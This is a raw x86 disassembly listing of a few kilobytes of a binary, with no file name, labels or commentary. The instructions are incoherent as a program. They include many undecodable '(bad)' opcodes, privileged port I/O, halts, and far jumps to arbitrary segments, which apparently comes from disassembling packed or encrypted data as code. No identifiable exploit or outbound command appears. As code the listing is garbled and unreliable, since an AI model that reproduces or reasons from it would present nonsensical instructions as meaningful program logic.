  422680:	add    eax,0x1894bf8
  422685:	repnz dec edx
  422687:	xchg   ebx,eax
  422688:	and    eax,0x2db10754
  42268d:	sub    al,0x37
  42268f:	inc    ecx
  422690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422691:	xor    eax,0x1688929e
  422696:	sub    edx,DWORD PTR [edi+0x76dfb137]
  42269c:	mul    DWORD PTR [edi-0x5]
  42269f:	push   ds
  4226a0:	sbb    edx,DWORD PTR [edi]
  4226a2:	ret    0xb534
  4226a5:	or     BYTE PTR [eax],0x85
  4226a8:	jnp    0x4226d8
  4226aa:	xchg   ecx,eax
  4226ab:	sar    BYTE PTR [edi+0x165951ba],0xbc
  4226b2:	and    ah,BYTE PTR [esi]
  4226b4:	and    bl,dh
  4226b6:	out    dx,al
  4226b7:	adc    BYTE PTR [ebx+ecx*4+0x46],al
  4226bb:	sub    ch,BYTE PTR [edx-0x57cd55e3]
  4226c1:	jmp    0x260671b4
  4226c6:	jbe    0x4226d4
  4226c8:	fist   WORD PTR [edi+0x42]
  4226cb:	das    
  4226cc:	jo     0x42273e
  4226ce:	add    cl,0xd9
  4226d1:	inc    edx
  4226d2:	jmp    0x422716
  4226d4:	mov    bh,0x95
  4226d6:	scas   eax,DWORD PTR es:[edi]
  4226d7:	adc    eax,0x734d636d
  4226dc:	cmp    DWORD PTR [eax+ecx*8],edx
  4226df:	mov    dl,0x66
  4226e1:	js     0x422754
  4226e3:	xchg   esi,eax
  4226e4:	(bad)  
  4226e5:	adc    edi,DWORD PTR [ebx-0x73]
  4226e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226e9:	dec    eax
  4226ea:	adc    eax,0x51d4fad1
  4226ef:	mov    dl,0x7
  4226f1:	or     ah,BYTE PTR [esi+0x49a0f9ef]
  4226f7:	xchg   ebx,eax
  4226f8:	cdq    
  4226f9:	xchg   esp,eax
  4226fa:	cli    
  4226fb:	inc    edi
  4226fc:	test   al,0xa8
  4226fe:	aas    
  4226ff:	not    esi
  422701:	adc    esp,ebp
  422703:	xchg   edx,eax
  422704:	(bad)  
  422706:	cmp    cl,BYTE PTR ss:[esi+0x4]
  42270a:	sbb    ebx,DWORD PTR ds:0xd9ae22fb
  422710:	xchg   esi,eax
  422711:	jnp    0x422760
  422713:	fild   DWORD PTR ds:0xe22fbbf8
  422719:	shr    BYTE PTR [eiz*2+0x32f2dbc3],cl
  422720:	sub    eax,0x5529b958
  422725:	mov    ecx,0xa38cc064
  42272a:	push   edx
  42272b:	add    eax,0xfe2c7e2a
  422730:	jge    0x422756
  422732:	fnstcw WORD PTR [ecx+0x64b2b471]
  422738:	lods   eax,DWORD PTR ds:[esi]
  422739:	ja     0x42271c
  42273b:	test   al,0x3f
  42273d:	fst    QWORD PTR [ebx-0x1e1a3c94]
  422743:	add    BYTE PTR [edx-0x43],ah
  422746:	clc    
  422747:	push   eax
  422748:	lock lock mul bh
  42274c:	pop    ecx
  42274d:	fadd   DWORD PTR [eax-0x79673db9]
  422753:	xor    DWORD PTR [eax],edx
  422755:	retf   0x8602
  422758:	mov    bl,0xfb
  42275a:	daa    
  42275b:	clc    
  42275c:	sub    dh,BYTE PTR [ebx]
  42275e:	ins    BYTE PTR es:[edi],dx
  42275f:	sbb    eax,0xab11d3d2
  422764:	jg     0x4227aa
  422766:	das    
  422767:	pop    ecx
  422768:	mov    ds:0xff4e06af,al
  42276d:	add    dl,BYTE PTR gs:[edi]
  422770:	in     al,0xbb
  422772:	gs dec esp
  422774:	sbb    al,0x9
  422776:	lea    edx,[esi+0x3a]
  422779:	adc    al,0x4
  42277b:	fsub   QWORD PTR ds:0xcb7f6d23
  422781:	es ret 0xd05b
  422785:	das    
  422786:	retf   0xf262
  422789:	fstp   QWORD PTR [ecx-0x63]
  42278c:	lods   eax,DWORD PTR ds:[esi]
  42278d:	jp     0x4227be
  42278f:	ins    DWORD PTR es:[edi],dx
  422790:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422791:	int3   
  422792:	rol    DWORD PTR [edx],cl
  422794:	push   ds
  422795:	push   0xda077669
  42279a:	cli    
  42279b:	adc    eax,0xb97baec7
  4227a0:	mov    esp,0xda1c41bb
  4227a5:	aad    0x5d
  4227a7:	mov    dl,0xf0
  4227a9:	jmp    0x1dff3984
  4227ae:	loop   0x4227a8
  4227b0:	xchg   ebp,eax
  4227b1:	cmp    edx,ebp
  4227b3:	ret    
  4227b4:	adc    BYTE PTR [edx+0x3a],al
  4227b7:	mov    ebp,0x755a06b6
  4227bc:	lds    esp,FWORD PTR [edx-0x1d2204ea]
  4227c2:	sbb    bh,cl
  4227c4:	(bad)  
  4227c5:	in     eax,dx
  4227c6:	dec    ebx
  4227c7:	outs   dx,DWORD PTR ds:[esi]
  4227c8:	call   0xc2ae:0xaa15ce8b
  4227cf:	mov    ecx,0x1824ea8a
  4227d4:	popa   
  4227d5:	push   0xc33b835a
  4227da:	rcr    BYTE PTR [ebx],1
  4227dc:	in     al,dx
  4227dd:	scas   al,BYTE PTR es:[edi]
  4227de:	pop    ecx
  4227df:	cmp    DWORD PTR [edx-0x3b906006],eax
  4227e5:	mov    ebp,0x3ac501b0
  4227ea:	or     DWORD PTR [eiz*8-0x6c19c70f],eax
  4227f1:	push   esp
  4227f2:	rol    DWORD PTR [esi],0x46
  4227f5:	test   eax,0x1bb6b706
  4227fa:	(bad)  
  4227fb:	mov    ds,WORD PTR [esp+eiz*4]
  4227fe:	inc    eax
  4227ff:	es xor al,0xde
  422802:	fcomp  DWORD PTR [edi-0xb]
  422805:	adc    ecx,eax
  422807:	(bad)  
  422809:	pop    edx
  42280a:	pop    es
  42280b:	cld    
  42280c:	jo     0x422793
  42280e:	mov    esp,0x79d0bf1f
  422813:	push   cs
  422814:	retf   0xddac
  422817:	fdiv   st,st(6)
  422819:	xchg   edx,eax
  42281a:	mov    al,ds:0xbbc2b31
  42281f:	adc    bl,BYTE PTR [ebx-0x428cf8b3]
  422825:	xor    DWORD PTR [eax],ebp
  422827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422828:	dec    ebx
  422829:	sbb    edx,DWORD PTR [ebx-0x3aa925dc]
  42282f:	ins    DWORD PTR es:[edi],dx
  422830:	sub    BYTE PTR ds:0xfd7f62eb,bh
  422836:	and    eax,0x3a56003d
  42283b:	outs   dx,DWORD PTR ds:[esi]
  42283c:	adc    bh,al
  42283e:	adc    edi,DWORD PTR [edx]
  422840:	inc    ecx
  422841:	fidivr DWORD PTR [ecx-0x5616f77f]
  422847:	imul   edx,DWORD PTR [eax-0x33],0x3a
  42284b:	fcmove st,st(5)
  42284d:	mov    bl,0x26
  42284f:	jbe    0x4228aa
  422851:	sub    ebp,DWORD PTR [ecx+0x53]
  422854:	cmp    al,0x1e
  422856:	cwde   
  422857:	jmp    0xedbf:0x70653f3c
  42285e:	sti    
  42285f:	jle    0x4228d7
  422861:	(bad)  
  422862:	mov    eax,ds:0x7e638391
  422867:	dec    eax
  422868:	pop    ds
  422869:	(bad)  
  42286b:	inc    ebp
  42286c:	pusha  
  42286d:	xchg   ebp,eax
  42286e:	xchg   DWORD PTR [edi-0x5a],ebp
  422871:	out    0x9c,eax
  422873:	daa    
  422874:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422875:	daa    
  422876:	test   al,0x1e
  422878:	imul   ebx,DWORD PTR [eax-0x5b],0x968c309e
  42287f:	mov    ah,0x6e
  422881:	(bad)  
  422882:	jg     0x422810
  422884:	mov    ebp,DWORD PTR ds:0x3bdce8a6
  42288a:	xor    al,0x95
  42288c:	sbb    BYTE PTR [edi-0x6c8b72db],bh
  422892:	mov    esp,0x4f8150a6
  422897:	jl     0x4228e8
  422899:	popf   
  42289a:	cwde   
  42289b:	mov    dl,0x79
  42289d:	xchg   edx,eax
  42289e:	sub    al,0x10
  4228a0:	sub    al,0x9
  4228a2:	call   0x6dd9:0x12d300fa
  4228a9:	leave  
  4228aa:	scas   al,BYTE PTR es:[edi]
  4228ab:	lahf   
  4228ac:	call   0x593af5d1
  4228b1:	mov    dh,0x6b
  4228b3:	cld    
  4228b4:	setb   BYTE PTR ds:0x557b2722
  4228bb:	popa   
  4228bc:	icebp  
  4228bd:	je     0x4228e4
  4228bf:	dec    ecx
  4228c0:	shl    DWORD PTR [eax+0x7a],1
  4228c3:	pop    ebx
  4228c4:	(bad)  [ebp+0x58]
  4228c7:	sti    
  4228c8:	cmp    bl,dh
  4228ca:	cs daa 
  4228cc:	jns    0x42293e
  4228ce:	frstor [esi]
  4228d0:	and    al,0x5
  4228d2:	hlt    
  4228d3:	fs pusha 
  4228d5:	and    ebp,DWORD PTR [ecx+edx*1-0x77]
  4228d9:	sub    eax,DWORD PTR [edi]
  4228db:	xchg   DWORD PTR [edx],ecx
  4228dd:	add    dl,BYTE PTR [ebp-0x6c]
  4228e0:	add    dl,BYTE PTR [ebx-0x48]
  4228e3:	push   ss
  4228e4:	jns    0x4228cd
  4228e6:	mov    al,ds:0x8c5dd1e2
  4228eb:	jo     0x422880
  4228ed:	fst    QWORD PTR [ecx]
  4228ef:	xchg   ebp,edi
  4228f1:	cmp    BYTE PTR [edi+0x60f1c725],bh
  4228f7:	popf   
  4228f8:	xlat   BYTE PTR ds:[ebx]
  4228f9:	sbb    ebx,esi
  4228fb:	bound  edx,QWORD PTR [edx+eiz*8]
  4228fe:	push   esp
  4228ff:	mov    ds,WORD PTR [ebp+0x179956fe]
  422905:	mov    edi,0x8dbf0932
  42290a:	cmp    al,0x1c
  42290c:	or     eax,DWORD PTR [ecx-0x58]
  42290f:	add    bh,BYTE PTR [edx+0x6f]
  422912:	lea    ebp,[ecx+0x32e2570c]
  422918:	(bad)  
  422919:	imul   ebx,esi,0x214ab271
  42291f:	xchg   BYTE PTR [esi],dl
  422921:	pop    esi
  422922:	retf   
  422923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422924:	pushf  
  422925:	dec    edi
  422926:	push   cs
  422927:	jmp    0x146827e7
  42292c:	sub    al,0xc6
  42292e:	clc    
  42292f:	lahf   
  422930:	jmp    0x422936
  422932:	jae    0x422950
  422934:	outs   dx,DWORD PTR ds:[esi]
  422935:	ficom  DWORD PTR [edx-0x1a40c82f]
  42293b:	add    eax,0x54d6afbf
  422940:	ret    0xc882
  422943:	mov    ebp,0x39d875a6
  422948:	xor    BYTE PTR [eax+0x42d17621],bh
  42294e:	jbe    0x422975
  422950:	pop    ss
  422951:	outs   dx,BYTE PTR ds:[esi]
  422952:	fstp   DWORD PTR [esi-0x118f35b8]
  422958:	scas   al,BYTE PTR es:[edi]
  422959:	pushf  
  42295a:	retf   0x39a
  42295d:	les    esi,FWORD PTR [ecx-0x60b5f47c]
  422963:	pop    es
  422964:	dec    ebp
  422965:	inc    esi
  422966:	sahf   
  422967:	gs out 0x73,eax
  42296a:	or     al,0x90
  42296c:	pushf  
  42296d:	ret    
  42296e:	lahf   
  42296f:	add    dh,BYTE PTR [ecx-0x54]
  422972:	scas   al,BYTE PTR es:[edi]
  422973:	jae    0x4229ca
  422975:	hlt    
  422976:	inc    esp
  422977:	jno    0x422979
  422979:	push   0x48
  42297b:	retf   0xe7d5
  42297e:	rcl    BYTE PTR [edi],0xde
  422981:	jg     0x422920
  422983:	call   0x716db7e2
  422988:	mov    esp,DWORD PTR [edx+0x223e5ea1]
  42298e:	scas   al,BYTE PTR es:[edi]
  42298f:	pop    esi
  422990:	loope  0x422920
  422992:	rcr    DWORD PTR [eax-0x4],0xad
  422996:	and    BYTE PTR gs:[eax],cl
  422999:	mov    dh,0x15
  42299b:	sbb    eax,DWORD PTR [ebp+0x4d]
  42299e:	js     0x42299e
  4229a0:	xchg   edx,eax
  4229a1:	cmp    edi,DWORD PTR [ebx]
  4229a3:	push   edx
  4229a4:	gs scas eax,DWORD PTR es:[edi]
  4229a6:	xor    eax,0x1a0faa86
  4229ab:	xchg   ebx,eax
  4229ac:	mov    ah,0x55
  4229ae:	hlt    
  4229af:	mov    bl,0xb1
  4229b1:	pop    es
  4229b2:	pop    ss
  4229b3:	jo     0x422a20
  4229b5:	inc    esi
  4229b6:	sub    DWORD PTR [ebp-0x72],ebp
  4229b9:	dec    ebp
  4229ba:	jl     0x422979
  4229bc:	or     al,0x5
  4229be:	push   es
  4229bf:	cld    
  4229c0:	cli    
  4229c1:	sbb    eax,0xa31f9808
  4229c6:	jecxz  0x422981
  4229c8:	xchg   ebp,eax
  4229c9:	mov    edi,0x92ffcf4c
  4229ce:	xchg   ebp,eax
  4229cf:	jp     0x42299f
  4229d1:	imul   ecx,DWORD PTR es:[ebp+esi*1+0x346189a3],0xa9957e55
  4229dd:	lods   eax,DWORD PTR ds:[esi]
  4229de:	nop
  4229df:	popf   
  4229e0:	int3   
  4229e1:	outs   dx,BYTE PTR ds:[esi]
  4229e2:	fwait
  4229e3:	gs cmp eax,0x64690fc1
  4229e9:	aaa    
  4229ea:	scas   al,BYTE PTR es:[edi]
  4229eb:	sbb    eax,0xd11075c8
  4229f0:	ss jo  0x4229a3
  4229f3:	lods   eax,DWORD PTR ds:[esi]
  4229f4:	retf   
  4229f5:	retf   0x6e6a
  4229f8:	pop    ds
  4229f9:	rcr    DWORD PTR [edi],cl
  4229fb:	sbb    bl,0x48
  4229fe:	stos   BYTE PTR es:[edi],al
  4229ff:	sbb    eax,0x69c42104
  422a04:	or     ah,BYTE PTR [eax-0x2]
  422a07:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  422a09:	or     al,0x3c
  422a0b:	paddb  mm4,mm5
  422a0e:	iret   
  422a0f:	es pop ecx
  422a11:	aaa    
  422a12:	retf   0x25c7
  422a15:	push   edi
  422a16:	or     BYTE PTR [edi+0x2d],ah
  422a19:	push   di
  422a1b:	fcmovnu st,st(5)
  422a1d:	aam    0xb8
  422a1f:	sbb    al,BYTE PTR gs:[edx]
  422a22:	lock pop edx
  422a24:	cwde   
  422a25:	push   ecx
  422a26:	loopne 0x422a0d
  422a28:	test   eax,0xfdf73340
  422a2d:	sbb    BYTE PTR [ecx-0x37c44339],al
  422a33:	stos   BYTE PTR es:[edi],al
  422a34:	stc    
  422a35:	shl    DWORD PTR [ecx-0x73f6c9d],1
  422a3b:	(bad)  
  422a3d:	rcl    DWORD PTR [eax-0x2bfb9a0c],1
  422a43:	push   ds
  422a44:	or     DWORD PTR [ecx+0x1b],edi
  422a47:	mov    BYTE PTR [ebp+ebp*8+0x6cc975a4],dh
  422a4e:	test   dl,cl
  422a50:	mov    ch,0x9e
  422a52:	push   ebp
  422a53:	mov    al,0xd8
  422a55:	jbe    0x4229f3
  422a57:	xor    dl,BYTE PTR [ecx+ebp*4-0x284492de]
  422a5e:	mov    bh,0x41
  422a60:	mov    BYTE PTR [edx-0x2e],al
  422a63:	sbb    BYTE PTR [esi],ch
  422a65:	(bad)  
  422a66:	cmp    ch,ch
  422a68:	mov    dl,0x89
  422a6a:	cwde   
  422a6b:	sub    BYTE PTR [ebx-0x1f],bl
  422a6e:	or     DWORD PTR cs:[edi+0x76],0xffffff9e
  422a73:	mov    dl,0xc2
  422a75:	mov    ch,0x5a
  422a77:	push   esi
  422a78:	jb     0x422a02
  422a7a:	mov    esp,0x4c8c79be
  422a7f:	aas    
  422a80:	lock lahf 
  422a82:	imul   ebp,esp,0x7
  422a85:	nop
  422a86:	mov    ch,0xe1
  422a88:	adc    ecx,ebx
  422a8a:	xor    al,0x8b
  422a8c:	sbb    eax,0xa570d0ce
  422a91:	or     BYTE PTR [esi],bh
  422a93:	test   eax,0x1413b976
  422a98:	cmp    esi,edi
  422a9a:	cwde   
  422a9b:	cmp    eax,0x91fc1e66
  422aa0:	les    ebx,FWORD PTR [eax-0x20]
  422aa3:	mov    ds:0xbe6c5a0,eax
  422aa8:	or     DWORD PTR [edi+eiz*8+0x12e8b589],esi
  422aaf:	enter  0x1aac,0x11
  422ab3:	call   0x9f3f3f82
  422ab8:	xor    DWORD PTR [eax+0x3ea1f85b],edi
  422abe:	push   eax
  422abf:	jnp    0x422ac3
  422ac1:	or     eax,0xd81f03fb
  422ac6:	jae    0x422adb
  422ac8:	js     0x422afe
  422aca:	mov    ah,0x18
  422acc:	and    al,0x0
  422ace:	add    BYTE PTR [eax],al
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	(bad)  
  422ad3:	xlat   BYTE PTR ds:[ebx]
  422ad4:	hlt    
  422ad5:	push   ebp
  422ad7:	jmp    FWORD PTR [ebx-0x21]
  422ada:	sub    al,0x7c
  422adc:	cmp    BYTE PTR [edx+0x3bf2a4d1],bh
  422ae2:	push   edi
  422ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ae4:	add    DWORD PTR [eax],eax
  422ae6:	repz add al,0x0
  422ae9:	add    BYTE PTR [esi+0x3c],ah
  422aec:	push   ds
  422aed:	mov    dh,BYTE PTR ds:0x27d1ce87
  422af3:	ds (bad) 
  422af5:	pop    eax
  422af6:	es push ebx
  422af8:	and    ah,al
  422afa:	les    eax,FWORD PTR [esi+0x76c84c26]
  422b00:	inc    edx
  422b01:	inc    eax
  422b02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b03:	je     0x422b06
  422b05:	rol    BYTE PTR [eax-0x9ba15e3],1
  422b0b:	add    esi,DWORD PTR [edx]
  422b0d:	jne    0x422b3c
  422b0f:	add    al,BYTE PTR [esi]
  422b11:	adc    DWORD PTR [eax],0x16646f36
  422b17:	jge    0x422b55
  422b19:	cs mov bl,BYTE PTR gs:[esi+0x660f20bd]
  422b21:	mov    dl,0xe9
  422b23:	xor    cl,ah
  422b25:	push   edi
  422b26:	or     eax,0x57b05e28
  422b2b:	pop    ds
  422b2c:	pop    ebx
  422b2d:	xchg   BYTE PTR [eax+edx*2],cl
  422b30:	mov    edx,edx
  422b32:	mov    edx,0x24e282fa
  422b37:	ret    
  422b38:	pop    eax
  422b39:	mov    esi,0xe7602801
  422b3e:	dec    edi
  422b3f:	outs   dx,BYTE PTR ds:[esi]
  422b40:	mov    bl,0xac
  422b42:	mov    cs,WORD PTR [ecx+ebx*4+0x295030e5]
  422b49:	std    
  422b4a:	outs   dx,DWORD PTR ds:[esi]
  422b4b:	out    0x6e,al
  422b4d:	push   edi
  422b4e:	and    ebp,DWORD PTR [esi+0x2c]
  422b51:	fstp   QWORD PTR [edi-0xa]
  422b54:	and    edx,DWORD PTR [ecx+0x22]
  422b57:	jl     0x422b9a
  422b59:	push   ebx
  422b5a:	ss scas al,BYTE PTR es:[edi]
  422b5c:	gs addr16 lahf 
  422b5f:	dec    esi
  422b60:	xchg   edi,eax
  422b61:	mov    eax,?
  422b63:	or     esi,0x46a87cee
  422b69:	push   ecx
  422b6a:	dec    ecx
  422b6b:	jo     0x422b4b
  422b6d:	and    al,BYTE PTR [ecx-0x4ffaac0d]
  422b73:	fcomp  DWORD PTR [eax-0x22829dc8]
  422b79:	call   FWORD PTR [esi]
  422b7b:	in     eax,0xad
  422b7d:	and    esi,ebp
  422b7f:	pop    ds
  422b80:	jl     0x422b93
  422b82:	aaa    
  422b83:	div    DWORD PTR [edi+0x71]
  422b86:	mov    eax,0xce1cabe4
  422b8b:	lea    eax,[edi+ecx*8+0x6a]
  422b8f:	cdq    
  422b90:	xchg   BYTE PTR ds:0x14ec9814,dh
  422b96:	and    DWORD PTR [ebx+ebp*8+0x31],ebp
  422b9a:	mov    cl,BYTE PTR fs:[ecx-0x3]
  422b9e:	ja     0x422b62
  422ba0:	dec    ebx
  422ba1:	lock xchg ebp,eax
  422ba3:	pushf  
  422ba4:	jmp    0x14e9:0x9638a0e2
  422bab:	pushf  
  422bac:	scas   al,BYTE PTR es:[edi]
  422bad:	mov    ds:0xb534ec41,al
  422bb2:	pop    edx
  422bb3:	ja     0x422be9
  422bb5:	cld    
  422bb6:	test   dh,ch
  422bb8:	dec    esi
  422bb9:	imul   edx,DWORD PTR ds:0x9f65a75e,0xe25c2bf4
  422bc3:	mov    WORD PTR [ebx],?
  422bc5:	mov    edx,0xd23c5a7a
  422bca:	clc    
  422bcb:	dec    ebx
  422bcc:	xchg   DWORD PTR [edx],esp
  422bce:	(bad)  
  422bcf:	retf   0xcdf2
  422bd2:	sbb    cl,BYTE PTR [edi-0x12]
  422bd5:	xchg   ebp,eax
  422bd6:	cli    
  422bd7:	dec    ebx
  422bd8:	fadd   DWORD PTR [ebx]
  422bda:	xchg   ebp,eax
  422bdb:	or     ch,BYTE PTR [edi]
  422bdd:	inc    esi
  422bde:	dec    ebp
  422bdf:	iret   
  422be0:	or     ah,BYTE PTR [ecx-0x1c]
  422be3:	outs   dx,BYTE PTR ds:[esi]
  422be4:	js     0x422ba6
  422be6:	and    DWORD PTR [ebp-0x71],eax
  422be9:	dec    esi
  422bea:	adc    al,BYTE PTR [edx+eax*1+0x547d6fef]
  422bf1:	test   DWORD PTR [eax+edx*4+0x1c],0x6b96a653
  422bf9:	jb     0x422c4a
  422bfb:	add    BYTE PTR [ecx],bl
  422bfd:	inc    edx
  422bfe:	retf   
  422bff:	(bad)  
  422c02:	add    DWORD PTR [edi+0x8633c26],0x76
  422c09:	mov    dl,0x80
  422c0b:	xchg   DWORD PTR [edx-0x63],ebp
  422c0e:	in     al,0x60
  422c10:	mov    ebx,0xb73586b7
  422c15:	pop    ss
  422c16:	cmc    
  422c17:	and    bh,BYTE PTR [esi]
  422c19:	push   ecx
  422c1a:	fistp  DWORD PTR [ebx-0x67]
  422c1d:	stos   DWORD PTR es:[edi],eax
  422c1e:	add    dh,BYTE PTR [ebx-0x34]
  422c21:	ficomp WORD PTR [ebp+0x4aee274]
  422c27:	pop    ds
  422c28:	js     0x422bb8
  422c2a:	ret    
  422c2b:	jbe    0x422c44
  422c2d:	lods   al,BYTE PTR ds:[esi]
  422c2e:	pop    ebp
  422c2f:	add    DWORD PTR [edx],ebp
  422c31:	icebp  
  422c32:	pusha  
  422c33:	inc    ebp
  422c34:	(bad)  
  422c35:	in     al,dx
  422c36:	dec    eax
  422c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c38:	lock in al,dx
  422c3a:	ficomp WORD PTR ds:0x3c326821
  422c40:	push   0xd8975912
  422c45:	addr16 leave 
  422c47:	and    ebx,DWORD PTR [eax+0x654234a4]
  422c4d:	shufps xmm5,XMMWORD PTR [esi],0xb0
  422c51:	sbb    esi,edx
  422c53:	push   eax
  422c54:	pop    esp
  422c55:	je     0x422be4
  422c57:	inc    ebx
  422c58:	out    dx,al
  422c59:	imul   eax,DWORD PTR [ebp-0x6c],0x2c14b9b2
  422c60:	cld    
  422c61:	out    dx,eax
  422c62:	xchg   edi,eax
  422c63:	and    BYTE PTR [esi],ch
  422c65:	pop    ds
  422c66:	imul   edi,DWORD PTR [esi],0x44dcba
  422c6c:	add    ebx,ebx
  422c6e:	xchg   ecx,eax
  422c6f:	push   eax
  422c70:	sbb    al,0x86
  422c72:	js     0x422c54
  422c74:	sub    bh,0x3d
  422c77:	inc    edx
  422c78:	(bad)  
  422c79:	jge    0x422ced
  422c7b:	ror    DWORD PTR [edi],1
  422c7d:	add    eax,0x8acdbef3
  422c82:	xor    DWORD PTR [esi],ebp
  422c84:	(bad)  
  422c85:	icebp  
  422c86:	sub    al,0x44
  422c88:	add    BYTE PTR [edx],cl
  422c8a:	retf   0x15c2
  422c8d:	stc    
  422c8e:	not    BYTE PTR [ebx]
  422c90:	add    ecx,DWORD PTR [edx-0x448a0408]
  422c96:	xor    esi,edx
  422c98:	aam    0xb5
  422c9a:	add    DWORD PTR [ebp-0x3e3ce77],edi
  422ca0:	xor    eax,0x63
  422ca3:	mov    BYTE PTR [ebx+0x50ac5941],dh
  422ca9:	inc    edi
  422caa:	add    DWORD PTR [edx+0x2d],0xb71c7343
  422cb1:	dec    esi
  422cb2:	inc    edx
  422cb3:	mov    edx,0x11483765
  422cb8:	or     al,0xee
  422cba:	mov    bh,0x7d
  422cbc:	leave  
  422cbd:	jne    0x422d26
  422cbf:	(bad)  
  422cc0:	in     eax,0x9
  422cc2:	sub    al,0x9c
  422cc4:	lock adc DWORD PTR [esi],ebp
  422cc7:	bound  edx,QWORD PTR [ecx]
  422cc9:	jnp    0x422d2d
  422ccb:	pop    edi
  422ccc:	sbb    ch,BYTE PTR [eax+ebp*8-0x498eddc4]
  422cd3:	mov    eax,0xec872e3e
  422cd8:	xor    ecx,DWORD PTR [edx+0x47]
  422cdb:	test   BYTE PTR [ebx],0xe0
  422cde:	pop    ebp
  422cdf:	enter  0xbc78,0x45
  422ce3:	cmc    
  422ce4:	dec    eax
  422ce5:	push   cs
  422ce6:	or     cl,BYTE PTR [ebx+0x2f]
  422ce9:	frstor [eax]
  422ceb:	stos   DWORD PTR es:[edi],eax
  422cec:	push   edx
  422ced:	dec    esi
  422cee:	addr16 mov esp,0x4fb1c825
  422cf4:	push   ss
  422cf5:	mov    al,ds:0xde32aa74
  422cfa:	ficomp WORD PTR [esp+edx*1-0x54]
  422cfe:	pop    edi
  422cff:	inc    esp
  422d00:	cmp    BYTE PTR [ebp-0x5f089b85],cl
  422d06:	add    ah,0x22
  422d09:	add    DWORD PTR ds:[edi+0xb37f85a],ebx
  422d10:	fwait
  422d11:	or     esp,DWORD PTR [ebx+esi*1]
  422d14:	imul   eax,DWORD PTR [ebx-0x6d],0xffffffa1
  422d18:	out    0x71,eax
  422d1a:	sbb    BYTE PTR [edx-0x2f4220ff],dl
  422d20:	ret    0xa7ca
  422d23:	inc    ebx
  422d24:	add    ecx,DWORD PTR [eax-0x4ed21323]
  422d2a:	stc    
  422d2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d2c:	pop    eax
  422d2d:	mov    edx,0xe21f317c
  422d32:	aad    0x51
  422d34:	mov    bl,0x20
  422d36:	xor    DWORD PTR [ebx-0x4ac52470],eax
  422d3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d3d:	pop    ebp
  422d3e:	cmc    
  422d3f:	int    0xa9
  422d41:	mov    esi,0xb9755324
  422d46:	leave  
  422d47:	mov    ds:0x8b882604,al
  422d4c:	pop    ebx
  422d4d:	call   0x6f2e:0x31e99a0a
  422d54:	jle    0x422da1
  422d56:	mul    DWORD PTR [ebp-0x1558c384]
  422d5c:	xchg   ebp,eax
  422d5d:	push   0x25
  422d5f:	lods   eax,DWORD PTR ds:[esi]
  422d60:	jp     0x422db9
  422d62:	jo     0x422cfa
  422d64:	mov    esp,0xc43822f5
  422d69:	(bad)  [esi+0x5c]
  422d6c:	sbb    ebx,DWORD PTR [esi+edi*4+0x1c9ee9b4]
  422d73:	and    BYTE PTR [ebp-0x30],dh
  422d76:	daa    
  422d77:	fnstenv [edi-0x25e75900]
  422d7d:	or     DWORD PTR ds:0x320156aa,edx
  422d83:	cmp    BYTE PTR ds:0x395b5d96,cl
  422d89:	sbb    eax,0xc07982c5
  422d8e:	cmp    BYTE PTR [ebp+0xd],ch
  422d91:	cmp    bl,bl
  422d93:	fcomp  DWORD PTR [ebx+0x892c007]
  422d99:	push   ecx
  422d9a:	or     dh,cl
  422d9c:	adc    eax,0x135865b3
  422da1:	fdivr  QWORD PTR [edi+eax*1+0x22bd8786]
  422da8:	sub    ebx,edi
  422daa:	hlt    
  422dab:	mov    dh,0x95
  422dad:	arpl   si,bx
  422daf:	mov    ds:0x568b38b0,eax
  422db4:	push   edx
  422db5:	pop    eax
  422db6:	cmp    bl,BYTE PTR [esi+ecx*4-0x52f7edf6]
  422dbd:	mov    eax,0xcc39c3c4
  422dc2:	mov    ecx,DWORD PTR [eax+eax*1-0x73594497]
  422dc9:	js     0x422dfc
  422dcb:	lods   al,BYTE PTR ds:[esi]
  422dcc:	test   BYTE PTR [edx-0x47],ah
  422dcf:	mov    DWORD PTR [ebp+0x122defe6],edi
  422dd5:	sbb    al,0x20
  422dd7:	mov    ebp,0xb887f09f
  422ddc:	fidivr DWORD PTR [edi+edi*8+0x63]
  422de0:	std    
  422de1:	xchg   ebp,eax
  422de2:	enter  0x6638,0x4c
  422de6:	xor    esi,DWORD PTR [esi-0x10cd6f9b]
  422dec:	out    dx,al
  422ded:	cmp    al,0x48
  422def:	fsubr  QWORD PTR [eax+0x39]
  422df2:	cwde   
  422df3:	dec    edx
  422df4:	out    0xe4,al
  422df6:	adc    al,0xd3
  422df8:	and    ebp,DWORD PTR ds:[ebx+edx*2+0x4d]
  422dfd:	add    ecx,DWORD PTR [edi]
  422dff:	dec    ebx
  422e00:	jg     0x422d8a
  422e02:	bound  ecx,QWORD PTR [eax+0x68c60d4e]
  422e08:	shl    WORD PTR [edi+0x2e],0xe3
  422e0d:	cli    
  422e0e:	call   0xc206:0x31e3b68f
  422e15:	inc    esp
  422e16:	imul   esp,DWORD PTR ds:[edx+0xf],0x8c4566f7
  422e1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e1f:	jle    0x422e27
  422e21:	stc    
  422e22:	push   es
  422e23:	jns    0x422e1f
  422e25:	aad    0x82
  422e27:	je     0x422e2d
  422e29:	arpl   WORD PTR [eax],dx
  422e2b:	xchg   ebx,eax
  422e2c:	(bad)  
  422e2d:	hlt    
  422e2e:	(bad)  [edx+0x26fcdb3e]
  422e34:	(bad)  
  422e35:	lods   al,BYTE PTR ds:[esi]
  422e36:	test   eax,0x28b6b395
  422e3b:	or     ecx,DWORD PTR [edx+0x2bc41371]
  422e41:	shr    DWORD PTR [eax-0x3f],1
  422e44:	bound  ebp,QWORD PTR [eax]
  422e46:	xor    al,0xe
  422e48:	mov    WORD PTR [edi],ds
  422e4a:	in     eax,0x84
  422e4c:	mov    dl,0x1e
  422e4e:	pop    ebx
  422e4f:	or     bh,cl
  422e51:	mov    dh,0x50
